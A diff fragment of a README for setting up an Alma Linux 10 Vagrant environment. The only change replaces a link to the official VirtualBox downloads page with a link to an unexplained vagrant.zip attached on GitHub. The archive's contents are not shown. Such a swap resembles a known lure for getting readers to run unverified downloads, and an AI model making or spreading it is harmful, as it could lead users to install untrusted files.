@@ -35,7 +35,7 @@ Before you begin, ensure you have the following software installed on your host 
 Follow these steps to set up and launch your development environment:
 
 1.  **Get the files**:  
-    Download and unpack the archive to a folder that you want to work in -> [Download Archive](https://www.virtualbox.org/wiki/Downloads)
+    Download and unpack the archive to a folder that you want to work in -> [Download Archive](https://github.com/user-attachments/files/20577117/vagrant.zip)
 
 2.  **Initialize and Start the Alma Linux 10 VM**:
 
